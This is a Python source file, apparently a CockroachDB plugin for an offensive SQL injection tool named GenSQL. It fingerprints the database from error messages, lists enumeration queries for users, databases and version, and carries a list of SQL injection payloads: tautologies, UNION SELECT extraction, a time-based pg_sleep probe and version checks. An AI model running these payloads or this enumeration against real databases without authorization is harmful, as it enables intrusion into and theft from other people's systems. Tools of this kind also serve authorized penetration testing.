#!/usr/bin/env python
# GenSQL Plugin: CockroachDB - by Jeevraj
"""CockroachDB DBMS plugin for GenSQL. Author: Jeevraj"""

import re


class CockroachDBFingerprint:
    """Fingerprint CockroachDB from error messages. Author: Jeevraj"""
    ERROR_SIGNATURES = [
        r"CockroachDB", r"crdb_internal", r"relation.*does not exist.*crdb",
        r"pq:.*CockroachDB", r"ERROR.*26257",
    ]

    def identify(self, response_body):
        for sig in self.ERROR_SIGNATURES:
            if re.search(sig, str(response_body), re.IGNORECASE):
                return True, "CockroachDB"
        return False, None


class CockroachDBEnumeration:
    """CockroachDB database enumeration. Author: Jeevraj"""

    LIST_DBS    = "SHOW DATABASES"
    LIST_USERS  = "SHOW USERS"
    GET_VERSION = "SELECT version()"
    GET_USER    = "SELECT current_user()"
    GET_DB      = "SELECT current_database()"

    QUERIES = {
        "current_user":  GET_USER,
        "current_db":    GET_DB,
        "list_dbs":      LIST_DBS,
        "version":       GET_VERSION,
    }


class CockroachDBConnector:
    """CockroachDB database connector via PostgreSQL wire protocol. Author: Jeevraj"""
    DBMS          = "CockroachDB"
    DBMS_ALIASES  = ("cockroachdb", "crdb", "cockroach")
    DEFAULT_PORT  = 26257

    # CockroachDB-specific SQL injection payloads (PostgreSQL-compatible)
    INJECTION_PAYLOADS = [
        "' OR '1'='1'--",
        "' AND 1=1--",
        "' UNION SELECT NULL, version()--",
        "'; SELECT pg_sleep(3)--",
        "' AND SUBSTRING(version(),1,11)='CockroachDB'--",
        "' UNION SELECT current_user(), current_database()--",
    ]

    ERROR_MESSAGES = [
        "CockroachDB",
        "crdb_internal",
        "relation does not exist",
        "syntax error at or near",
    ]

    def connect(self, host="localhost", port=26257, user="root", password="",
                database="defaultdb"):
        try:
            import psycopg2
            self.conn = psycopg2.connect(
                host=host, port=port, user=user,
                password=password, database=database,
                sslmode="disable",
            )
            return True
        except Exception:
            return False

    def disconnect(self):
        if hasattr(self, "conn") and self.conn:
            try:
                self.conn.close()
            except Exception:
                pass

    def execute(self, query):
        try:
            cur = self.conn.cursor()
            cur.execute(query)
            return cur.fetchall()
        except Exception:
            return []


class CockroachDBMap(CockroachDBConnector, CockroachDBEnumeration, CockroachDBFingerprint):
    """GenSQL combined DBMS plugin for CockroachDB. Author: Jeevraj"""
    pass
